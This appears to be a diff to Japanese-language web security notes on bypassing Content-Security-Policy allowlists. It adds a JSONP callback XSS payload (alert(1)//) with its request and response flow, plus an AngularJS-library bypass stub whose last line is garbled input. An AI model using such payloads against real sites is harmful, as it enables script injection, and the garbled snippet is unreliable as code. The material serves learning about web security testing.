@@ -68,17 +68,39 @@ script-src 'self' 'unsafe-inline'
 
 ### ホストベースの構成
 ```http
-Content-Security-Policy: script-src 'self' test.example.com
+Content-Security-Policy: script-src 'self' csp.example.com
 ```
 のようになっている場合
 以下の２点をチェックする
 
 **JSONPエンドポイントの有無**
 
-*test.example.com* に
+*csp.example.com* からスクリプトを返させることによって SOP(Same-Origin-Policy) の制限をバイパスする手法。
 
-**そのサーバのライブラリ**
+Attacker -> Target
+```html
+<script src="http://csp.example.com/jsonp?callback=alert(1)//"></script>
+```
 
+Target -> csp.example.com
+```text
+http://csp.example.com/jsonp?callback=alert(1)//
+#通常 callback 関数を要求していますが、今回はalertが渡されている
+```
+
+csp.example.com -> Target
+```javascript
+alert(1)//({name:aaaa})
+// "alert(1)//" に引数を付けて返すがコメントアウトされ alert(1) が実行される
+```
+
+
+**サーバのライブラリ**
+
+```
+<script src="csp.example.com/angular.js"></script>
+<ぢvんg-あっpんｇ－ｃｓｐ＞｛
+```
 
 
 ### ディレクティブの設定不備により脆弱性が生まれるパターン
